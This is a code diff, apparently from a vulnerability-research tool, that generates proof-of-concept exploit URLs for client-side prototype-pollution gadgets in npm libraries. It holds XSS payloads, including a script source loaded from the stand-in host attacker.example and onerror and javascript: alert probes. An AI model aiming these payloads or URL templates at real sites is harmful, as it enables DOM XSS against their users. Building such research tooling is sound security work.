@@ -104,10 +104,11 @@ export async function reproduceRce(packageName, entryPoint, spec, opts = {}) {
     verified: true,
     payloadType: first.payloadType,
     canary: first.canary,
+    sink: first.sink || null,
     gates,
     restriction: gates.length ? 'gated' : 'none',
     runs: REQUIRED_AGREEING_RUNS,
-    standalonePoC: buildRcePoC(packageName, opts.version, entryPoint, spec, first),
+    standalonePoC: buildRcePoC(packageName, opts.version, entryPoint, spec, first, opts.browserEnv === true),
   };
 }
 
@@ -175,7 +176,53 @@ ${payloadLine ? payloadLine + '\n' : ''}${call}
 console.log(${readBack}); // => ${valJson}  (Object.prototype polluted)`;
 }
 
-function buildRcePoC(pkg, version, entryPoint, spec, res) {
+// Pick an XSS payload appropriate to the DOM sink that actually fired, so the
+// browser-URL PoC is accurate rather than a one-size-fits-all guess.
+function xssPayloadForSink(sink) {
+  if (sink === 'script.src') return '//attacker.example/xss.js';
+  if (sink && (sink.endsWith('.src') || sink === 'setAttribute:src' ||
+               sink === 'setAttribute:href' || sink === 'setAttribute:formaction' ||
+               sink === 'setAttribute:action')) {
+    return 'javascript:alert(document.domain)';
+  }
+  // innerHTML / outerHTML / insertAdjacentHTML / document.write / srcdoc, or an
+  // unknown DOM sink: an HTML payload with a self-firing handler.
+  return '<img src=x onerror=alert(document.domain)>';
+}
+
+// Client-side gadgets are exploited from the URL: a page that pollutes
+// Object.prototype from query-string params (the standard client-side PP source)
+// + this library's gadget = DOM XSS. Emit the exploit URL rather than a Node
+// require() PoC. The tool confirmed the LIBRARY gadget (prop -> DOM sink);
+// jsdom doesn't execute scripts, so this is reachability, and the full exploit
+// also needs a client-side PP source on the target page.
+function buildBrowserGadgetPoC(pkg, version, entryPoint, spec, res) {
+  const specStr = version ? `${pkg}@${version}` : pkg;
+  const prop = spec.property;
+  const sink = res.sink || (res.payloadType === 'sink_reach' ? 'a DOM sink' : 'code execution');
+  const isCodeExec = !res.sink && res.payloadType !== 'sink_reach';
+  const payload = isCodeExec ? 'alert(document.domain)' : xssPayloadForSink(res.sink);
+  const enc = encodeURIComponent(payload);
+  const gateParams = (res.gates || []).map(g => `&__proto__[${encodeURIComponent(g)}]=1`).join('');
+  return `// PoC — CLIENT-SIDE prototype pollution -> ${isCodeExec ? 'code execution' : 'DOM XSS'} gadget in ${specStr} via ${entryPoint}()
+// Reproduced independently in ${res.runs || 2} fresh processes (polluted value reached ${sink} under jsdom).
+//
+// ${pkg} reads Object.prototype.${prop} and routes it to ${sink}. On a page that
+// pollutes Object.prototype from the URL (the standard client-side PP source —
+// a query-string parser / router), this URL triggers the gadget:
+//
+//   https://TARGET/?__proto__[${prop}]=${enc}${gateParams}
+//   https://TARGET/?constructor[prototype][${prop}]=${enc}${gateParams}
+//
+// decoded payload (for ${sink}): ${payload}
+//
+// NOTE: the tool confirmed the LIBRARY gadget (prop -> sink); jsdom does not
+// execute scripts, so this is REACHABILITY, not proven execution. The full
+// exploit also requires a client-side PP source on the target page.`;
+}
+
+function buildRcePoC(pkg, version, entryPoint, spec, res, browserEnv) {
+  if (browserEnv) return buildBrowserGadgetPoC(pkg, version, entryPoint, spec, res);
   const specStr = version ? `${pkg}@${version}` : pkg;
   // Bracket notation with JSON.stringify so gate/property names that aren't
   // valid identifiers still produce runnable JS.
